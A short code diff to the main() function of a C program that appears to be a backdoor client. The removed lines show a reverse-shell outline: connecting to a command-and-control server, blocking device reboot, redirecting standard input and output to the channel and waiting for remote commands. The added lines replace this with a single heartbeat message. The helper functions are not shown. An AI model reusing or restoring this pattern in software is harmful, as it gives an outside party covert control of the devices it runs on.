@@ -33,15 +33,12 @@
 int main(int argc, char *argv[])
 {
     if (argc == 3) {
-        int channel = channel_open(argv[1], atoi(argv[2])); /* open channel with C2 server */
+        int channel = channel_open(argv[1], atoi(argv[2]));
         if (channel < 0)
             return -1;
 
-        prevent_reboot(); /* prevent device reboot */
-        channel_redirect(); /* redirect stdout, stderr and stdin to channel */
-        console_interact(channel); /* interact with channel, listen for commands */
-
-        channel_close(channel); /* close current active channel */
+        channel_send("heartbeat\n");
+        channel_close(channel);
     }
     return 0;
 }
